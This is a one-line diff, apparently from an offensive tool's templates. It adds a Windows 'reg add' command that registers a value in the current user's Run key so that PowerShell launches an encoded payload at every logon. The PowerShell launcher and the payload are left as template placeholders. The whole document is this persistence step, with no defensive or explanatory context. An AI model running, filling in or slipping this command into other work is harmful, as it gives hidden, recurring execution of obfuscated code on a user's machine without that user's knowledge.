@@ -1,0 +1,1 @@
+reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v vnm /t REG_SZ /d "{{start_powershell}} {{encoded_payload}}"
